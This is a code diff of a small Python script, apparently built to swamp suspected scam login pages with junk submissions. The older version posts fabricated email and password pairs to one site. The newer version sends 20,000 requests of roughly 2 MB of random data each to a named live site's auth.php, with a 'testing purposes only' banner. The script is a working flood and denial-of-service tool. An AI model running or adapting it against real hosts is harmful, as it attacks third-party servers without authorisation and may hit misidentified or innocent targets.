@@ -1,20 +1,25 @@
 import os
+import sys
 import random
 import urllib3
+import string
 
-counter = 0
-names = []
-http = urllib3.PoolManager()
+counter = 1
+http = urllib3.PoolManager(maxsize=500)
 
-print ("Reading names into Array")
 
-with open("names.txt", "r") as flash:
-	for line in flash:
-		names.extend(line.split())
+def randomStuff(length=2097152):
+  return str(os.urandom(length))
 
-for item in names:
 
-    email = item + "@gmail.com"
-    password = item + str(random.randint(1000,9999))
-    response = http.request('POST', 'https://dopplers.club/auth.php?doAuth=1&login='+email+'&password='+password)
-    print ("item: "+item+" email: "+email+" pass: "+password+" http_status: "+str(response.status))
+print ("This tool is for testing purposes only.")
+#url= input("Enter URL to scamwebsite (e.g.: skinboron.in): ") 
+
+while counter < 20000:
+    user = randomStuff()
+    password = randomStuff()
+    #response = http.request('POST', 'https://'+url+'/auth.php?doAuth=1&login='+user+'&password='+password)
+    response = http.request('POST', 'https://hyperxpulse.com/auth.php?doAuth=1&login='+user+'&password='+password)
+    print ("size of request: "+str(round(2*sys.getsizeof(user)/1024/1024, 2))+"MB / http_status: "+str(response.status))
+   #" user: "+user[0:4]+"[...] / pass: "+password[0:4]+"[...] / 
+    counter += 1
